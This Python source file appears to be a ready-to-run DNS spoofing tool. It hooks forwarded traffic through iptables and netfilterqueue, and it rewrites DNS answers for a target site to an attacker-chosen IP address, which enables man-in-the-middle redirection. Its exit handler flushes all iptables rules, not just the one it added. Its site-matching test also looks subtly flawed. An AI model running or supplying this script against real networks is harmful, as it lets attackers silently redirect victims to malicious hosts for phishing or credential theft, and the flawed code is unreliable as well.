from scapy.all import *
import os
from netfilterqueue import NetfilterQueue
import sys
import argparse

if len(sys.argv)!=3:
    print('Usage is ./dns_spoof.py ip site')
    print('Example - ./dns_spoof.py 192.168.1.1 www.google.com')
    sys.exit(1)

def ip_table():
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in bytes(sys.argv[2], 'utf-8'):
        print("no modification:", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=sys.argv[1])
    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet

QUEUE_NUM = 0
ip_table()
queue = NetfilterQueue()
try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    #restore ip table state
    print("\n[-] Ctrl + C detected.....Restoring ip Tables!")
    os.system("iptables --flush")
